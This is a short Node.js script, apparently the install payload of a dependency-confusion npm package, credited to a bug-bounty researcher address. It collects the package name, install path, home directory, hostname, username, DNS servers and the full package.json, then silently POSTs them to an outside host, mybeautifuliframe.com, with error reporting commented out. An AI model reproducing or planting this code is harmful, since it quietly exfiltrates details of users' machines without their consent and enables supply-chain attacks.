//author:- null_hypothesis@wearehackerone.com
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const os = require("os");
const packageJSON = require("./package.json");
const package = packageJSON.name;

const extraData = JSON.stringify({
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: dns.getServers(),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
});

var postData = querystring.stringify({
    msg: extraData,
});

var options = {
    hostname: "binary-bot-ccmwya12vtc0000f7ne0ggkqxfryyyyyb.mybeautifuliframe.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
